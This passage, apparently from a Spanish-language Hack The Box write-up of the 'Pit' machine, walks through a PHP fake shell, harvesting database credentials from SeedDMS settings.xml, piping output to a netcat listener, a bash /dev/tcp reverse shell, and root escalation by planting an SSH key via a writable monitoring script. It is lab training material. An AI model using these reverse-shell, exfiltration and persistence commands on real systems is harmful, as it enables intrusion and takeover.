**Me gusto como quedo en cuanto a lo que hace el script, nos logeamos, subimos PHP y generamos la fake-shell, peeeero como el servidor borra cada cierto los archivos de la carpeta de **michelle** pues jugamos con eso y cuando nos devuelva `File not found` volvemos a subir el archivo PHP sin perder la fake-shell :)**

Es medio fea, ya que no podemos movernos de la carpeta en la que aparecemos, as√≠ que tenemos que jugar con rutas absolutas o `../../../` üòõ

...

Record√© una utilidad de [S4vitar](https://s4vitar.github.io/) que nos permite obtener una Shell en la que podemos movernos (`cd`) entre carpetas sin problemas, algo que en la nuestra no se puede. Esto lo hace jugando con tuber√≠as y cositas locas, les dejo el link, ta buenasa:

* [github.com/s4vitar - TTY Over HTTP](https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py).

Solo deber√≠amos cambiar la URL en la que este nuestro archivo `php` y en mi caso cambiar `cmd` a `xmd`...

Pero como va un poco lento (por el tema de las tuber√≠as) y como hicimos uno propio, pues juguemos con el propio e.e

...

## Encontramos credenciales en el archivo settings.xml [üìå](#expl_settingsXML) {#expl_settingsXML}

Enumerando encontramos un archivo llamado `settings.xml`, en √©l vemos unas credenciales de una base de datos:

```bash
$ ls -la /var/www/html/seeddms51x/conf
total 40
drwxr-xr-x. 2 nginx nginx    93 Mar  2  2020 .
drwxr-xr-x. 7 nginx nginx    68 Apr 21  2020 ..
-rw-r--r--. 1 nginx nginx   261 Jan 15  2020 .htaccess
-r--------. 1 nginx nginx 11933 Apr 21  2020 settings.xml
-rw-r--r--. 1 nginx nginx 13771 Mar 14  2018 settings.xml.template
-rw-r--r--. 1 nginx nginx  4247 Feb 20  2013 stopwords.txt
```

```xml
...
<!--
   - dbDriver: DB-Driver used by adodb (see adodb-readme)
   - dbHostname: DB-Server
   - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)
   - dbUser: username for database-access
   - dbPass: password for database-access
-->
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false"></database>
...
```

Como son del servidor de base de datos podemos probar a ver si encontramos alguna tabla con algo comprometedor o algo que podamos crackear...

Como la Shell es una tristeza :P vamos a jugar con las herramientas [mysqlshow](https://www.thegeekstuff.com/2008/08/get-quick-info-on-mysql-db-table-column-and-index-using-mysqlshow/) para ver que bases de datos y tablas existen yyy con [mysqldump](https://www.linuxtotal.com.mx/index.php?cont=info_admon_021) para simular un "backup" de la info de esas tablas (o sea, nos muestra lo que contienen).

(**No encontramos nada √∫til, pero les dejo los comandos como aprendizaje**)

Vemos las bases de datos actuales (`-pPASSWORD`):

```bash
‚ù± python3 fakeSheedDMS.py
nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu
```

Vemos las tablas de X base de datos, existe una llamada **seeddms**:

```bash
nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu seeddms
```

De todas las tablas existen 3 llamativas: `tblUserPasswordHistory`, `tblUserPasswordRequest` y `tblUsers`.

Con **mysqlshow** podemos ver la estructura de cada tabla m√°s no su informaci√≥n, juguemos con **mysqldump**:

```bash
nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordHistory
nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordRequest
nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUsers
```

La √∫nica que devuelve informaci√≥n es `tblUsers`, encontramos la password en formato hash **MD5**, pero al intentar crackearlas solo encontramos resultado con **michelle** (que seria `michelle` :P)

...

Jugando con **SSH** obtenemos este error siempre:

```bash
‚ù± ssh michelle@10.10.10.241
michelle@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

Intentando arreglarlo no lo logramos :(

...

# Ejecuci√≥n de comandos en servidor CentOS por medio de la interfaz web [#](#expl_centos_login_done) {#expl_centos_login_done}

Volviendo atr√°s record√© el login que ten√≠amos contra el servidor **CentOS** con `cockpit`, ¬ølo recuerdas? Pues probando esa contrase√±a con el usuario **michelle** logramos acceder (:

![346page9090_dashboard](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_dashboard.png)

Lissssssstones, enumerando un poquito la web encontramos esto:

![346page9090_terminalLink](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_terminalLink.png)

Damos clic y nos muestra esto:

![346page9090_terminal](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_terminal.png)

Y s√≠, es una terminal, pero no vemos nada de lo que escribimos üôÉ interesante jajaj .__. Intentando comprobar si es funcional logramos cositas:

Podemos decirle que nos env√≠e el resultado de un comando a alg√∫n puerto en el que estemos escuchando:

Nos ponemos en escucha: `nc -lvp 4433`.

Y ejecutamos (aunque no se vea) el comando `id`, tomara el resultado y lo enviara al puerto **4433** de nuestra m√°quina:

```bash
id | nc 10.10.14.146 4433
```

Damos enter y en nuestro listener recibimos:

```bash
‚ù± nc -lvp 4433
listening on [any] 4433 ...
connect to [10.10.14.146] from pit.htb [10.10.10.241] 34018
uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0
```

Opa, estamos ejecutando comandos como **michelle** (: comprobando el comando `hostname` nos devuelve **pit.htb** y jugando con `curL` comprobamos que existe el binario, as√≠ que podemos destacar que claramente **nginx** no ten√≠a permisos contra algunos binarios (por si alguien se lo preguntaba :P)

---

### <u>Obtenemos reverse shell como michelle</u>

Nos volvemos a poner en escucha y en la web ejecutamos:

```bash
bash -c 'bash >& /dev/tcp/10.10.14.146/4433 0>&1'
```

Lo que generara una bash hacia nuestro puerto... Dando enter obtenemos en nuestro listener:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_nc_michelleRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos una Shell pero bastante fea eh! Lo bueno es que podemos intentar el transformarla en una **Full TTY** o sea, que sea interactiva y que se vea bonita, hag√°moslo r√°pidamente:

Escribimos `script /dev/null -c bash`:

```bash
script /dev/null -c bash
Script started, file is /dev/null
[michelle@pit ~]$
```

La pausamos ejecutando `CTRL+Z`:

```bash
[michelle@pit ~]$ ^Z
[1]+  Detenido                nc -lvp 4433
```

```bash
‚ù± stty raw -echo; fg
```

Escribimos `reset` y ahora:

```bash
[michelle@pit ~]$ export TERM=xterm
[michelle@pit ~]$ export SHELL=bash
```

Por √∫ltimo abrimos una nueva terminal y ejecutamos `stty -a`, tomamos esos valores, volvemos a la Shell de **michelle** y los escribimos en este comando (esos son mis valores):

```bash
[michelle@pit ~]$ stty rows 43 columns 192
```

Y listo, tenemos una Shell completamente interactiva, es bonita, podemos movernos entre comandos, tenemos hist√≥rico y no nos debemos preocupar si ejecutamos `CTRL+C`, ya que no la perderemos.

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Estando dentro del sistema la enumeraci√≥n nos esta matando, no encontramos nada de nada...

Hasta que record√© lo que hab√≠amos visto con **snmpbulkwalk** al obtener los usuarios **michelle** y **root**, hab√≠a un proceso de monitoreo en ejecuci√≥n y hab√≠a una cadena que hac√≠a referencia a un binario:

* `/usb/bin/monitor`.

Busqu√©moslo a ver si tiene algo que ver:

```bash
[michelle@pit ~]$ ls -la /usr/bin/monitor 
-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
```

```bash
[michelle@pit ~]$ file /usr/bin/monitor 
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
```

Es un script, veamoslo:

```bash
[michelle@pit ~]$ cat /usr/bin/monitor 
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

WTF... Un bucle que de la ruta `/usr/local/monitoring/` toma los archivos que empiecen por `check` y terminen en `sh` yyy los ejecuta... ¬øehhhh?

S√≠ esta es la manera de escalar es muy sencillo, ya que simplemente deber√≠amos incluir un archivo en esa ruta con ese inicio, ese final y rogar√≠amos a la virgensita para que **root** tenga alguna tarea cron o servicio ejecutando `/usr/bin/monitor`.

Veamos si tenemos [permisos de escritura](https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php#test) con un **if** sobre la ruta:

```bash
[michelle@pit ~]$ if [ -w "/usr/local/monitoring" ]; then echo "WRITABLE"; else echo "NOT WRITABLE"; fi
WRITABLE
```

Bien, al parecer si, para asegurarnos hacemos la f√°cil:

```bash
[michelle@pit ~]$ echo "holaaaaaaaaaaaaaaa" > /usr/local/monitoring/hola.txt
[michelle@pit ~]$ ls -la /usr/local/monitoring/hola.txt
-rw-rw-r--. 1 michelle michelle 19 Jun 29 25:25 /usr/local/monitoring/hola.txt
[michelle@pit ~]$ cat /usr/local/monitoring/hola.txt
holaaaaaaaaaaaaaaa
```

Bien, confirmado. Entonces intentemos generar el archivo que colocaremos en esa ruta y veamos si pasa algo.

---

## Generamos script que ejecutar√° <u>/usr/bin/monitor</u> [üìå](#privesc_scriptcheck) {#privesc_scriptcheck}

Para validar que el script nos funcione podemos indicarle que haga varias cositas:

```bash
‚ù± cat checkea.sh
#!/bin/bash

id > /home/michelle/id.txt
id | nc 10.10.14.146 4435
```

Al ser ejecutado crear√≠a un archivo en la ruta `/home/michelle/` llamado `id.txt` con el contenido del comando `id` (que deber√≠a ser del usuario `root`, o el que est√© ejecutando `/usr/bin/monitor`) y enviar√≠a el mismo resultado, pero a un puerto por el que estaremos escuchando...

```bash
‚ù± nc -lvp 4435
```

Subimos el script:

```bash
‚ù± python3 -m http.server
```

```bash
[michelle@pit ~]$ mkdir testeando
[michelle@pit ~]$ cd testeando/
[michelle@pit ~/testeando]$ curl http://10.10.14.146:8000/checkea.sh -o checkea.sh
```

Ahora d√©mosle permisos de ejecuci√≥n:

```bash
[michelle@pit ~/testeando]$ chmod +x checkea.sh
```

Y finalmente lo copiamos a la ruta:

```bash
[michelle@pit ~/testeando]$ cp checkea.sh /usr/local/monitoring/
```

Ahora deber√≠amos esperar a ver que pasa...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_gif_carwithabigtree.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Y no pasa nada... üòÄ (sonri√≥, pero no sonri√≥ en realidad)

Despu√©s de muchas pruebas e intentos logramos ver algo distinto...

Subimos el archivo, lo copiamos a la ruta y todo igual, pero mientras estaba el archivo ah√≠ se me dio por volver a probar el **snmpbulkwalk** por curiosidad sobre el proceso de "monitoreo" y vaya vaya:

```bash
‚ù± snmpbulkwalk -v2c -c public 10.10.10.241 iso
```

![346bash_snmpWalkbulk_ex_iso_foundScript](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso_foundScript.png)

Al menos sabemos que se esta intentando ejecutar el script, pero nos da **Permission Denied** contra el binario `netcat` y en la creaci√≥n del archivo `id.txt`...

De nuevo despu√©s de varias pruebas nos damos cuenta de que `/usr/bin/monitor` es ejecutado una vez jugamos con **snmp**... Yyyy al final, algo nos dio resultado:

Podemos probar en guardar nuestra llave p√∫blica **SSH** en el archivo `/root/.ssh/authorized_keys`, esto le indicar√° al sistema que a todas las llaves (identificaciones) dentro de ese archivo les permita acceso, pero para obtener ese acceso debemos hacer uso de la llave privada (que ser√≠a el remplazo de una contrase√±a (ya que no la tenemos :P)) asociada a esa llave p√∫blica. Entonces si hacen match la llave p√∫blica guardada en `authorized_keys` con la llave privada indicada al intentarnos conectar por **SSH**, nos deber√≠a devolver una **Shell** como **root** (porque estamos guardando nuestra "credencial" en el archivo `authorized_keys` del usuario **root**), d√©mosle:

* [How To Set up SSH Keys on a Linux / Unix System](https://www.cyberciti.biz/faq/how-to-set-up-ssh-keys-on-linux-unix/).

Primero generamos nuestras llaves (si no las tenemos):

**(De la forma sencilla)**

```bash
‚ù± ssh-keygen -t rsa
```

Finalmente deber√≠amos tener estos archivos en la carpeta `~/.ssh`:

```bash
‚ù± ls
id_rsa  id_rsa.pub
```

* `id_rsa` es nuestra llave privada (no compartir con nadie).
* `id_rsa.pub` es nuestra llave p√∫blica, esta es la que se usa para poder autenticarnos contra otros sistemas sin necesidad de proveer contrase√±as.

Listos, tomamos el contenido de la llave p√∫blica, lo pegamos en el script y le indicamos que tome tooooooooda la llave como una cadena de texto y la agregue en el archivo `/root/.ssh/authorized_keys`:

![346bash_script_idRSApub](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_script_idRSApub.png)

Ahora, subimos el script, lo copiamos a la ruta y ejecutamos **snmpbulkwalk**:

```bash
[michelle@pit ~/testeando]$ curl http://10.10.14.146:8000/checkea.sh -o checkea.sh
[michelle@pit ~/testeando]$ chmod +x checkea.sh
[michelle@pit ~/testeando]$ cp checkea.sh /usr/local/monitoring/
[michelle@pit ~/testeando]$ ls -la /usr/local/monitoring/checkea.sh
-rwxrwxr-x. 1 michelle michelle 612 Jun 29 25:25 /usr/local/monitoring/checkea.sh
```

```bash
‚ù± snmpbulkwalk -v2c -c public 10.10.10.241 iso
```

No vemos ning√∫n problema (al parecer):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso_scriptDone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Intentamos ahora conectarnos por **SSH** pas√°ndole nuestra llave privada como identificaci√≥n:

```bash
‚ù± ssh root@10.10.10.241 -i ~/.ssh/id_rsa
```

Yyyyyyyyyyyyyyyyy...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_monitor_ssh_rootDone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMOOOOOOOOOOOOOOOOOOOOOOS DENTROOOOOOOOO DE LA M√ÅQUINAAAAAAAAAAAAA COMOOOO **ROOOOOOT**!!

Veamos las flags...

![346flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346flags.png)

FIN!! NO VA M√ÅS!!

...

Dios, fue una m√°quina bastante, ihss, no s√©, muy poco amigable jjaajaj, pero bueno, se aprendi√≥, se hizo un lindo **script** y pensamos mucho lateralmente.

La parte del script (privesc) fue algo extra√±a. Lo que me gusto es que todo lo que encontramos se us√≥, as√≠ que bien ah√≠!!

Y bueno, nos leeremos en otros rincones de tu mente, descansa (de verdad) pero recuerda, a seguir ROMPIENDO todoooooooooooo!